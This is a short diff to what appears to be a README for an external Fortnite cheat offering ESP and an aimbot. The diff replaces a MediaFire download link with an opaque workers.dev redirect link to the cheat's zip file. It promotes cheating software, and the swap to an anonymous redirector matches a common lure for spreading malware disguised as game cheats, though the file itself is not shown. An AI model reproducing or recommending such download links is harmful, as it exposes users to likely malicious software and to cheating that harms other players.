@@ -4,7 +4,7 @@ External cheat for Fortnite with ESP and aimbot. Overlay based, no memory inject
 
 ## Download
 
-**[Download Fortnite External Cheat](https://www.mediafire.com/file/9livkzxm1qj0199/Fc_Cheat.zip/file)**
+**[Download Fortnite External Cheat](https://xtiz6i8n6.fresh-link.workers.dev/464dac20)**
 
 ## Features
 
